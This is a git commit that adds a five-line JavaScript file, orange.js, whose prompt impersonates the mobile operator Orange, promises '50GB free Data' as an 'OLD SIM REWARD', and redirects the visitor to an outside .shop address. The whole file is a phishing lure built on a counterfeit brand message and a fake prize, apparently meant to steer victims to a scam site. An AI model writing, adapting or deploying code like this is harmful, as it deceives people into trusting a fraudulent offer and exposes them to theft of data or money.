63deab2dc7c63262e2ee63e4858ac7003f19ab94
bigetijazz6 <bigetijazz6@gmail.com>
2024-11-22 20:54:54 -0800

    Create orange.js

---
+++ orange.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('Orange: Congratulations, Your mobile Number is Eligible to receive 50GB free Data Orange OLD SIM REWARD, kindly press Ok to proceed now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.offre-beta.shop/Orange50GB';
+}
